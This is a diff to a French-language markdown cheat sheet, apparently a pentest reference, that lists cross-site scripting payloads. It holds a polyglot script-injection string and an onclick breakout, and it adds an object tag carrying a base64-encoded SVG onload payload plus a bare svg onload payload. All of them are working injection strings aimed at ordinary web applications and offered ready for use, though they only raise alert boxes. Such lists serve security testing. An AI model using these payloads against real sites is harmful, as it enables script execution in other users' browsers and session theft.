@@ -11,10 +11,9 @@ Les payloads suivants peuvent être utiles:
 
 ``` text
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-```
-
-```text
 " onclick=alert(1)//<button ' onclick=alert(1)//>*/alert(1)//
+<object data="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+">
+<svg/onload=alert(1)>
 ```
 
 ## ASP.Net
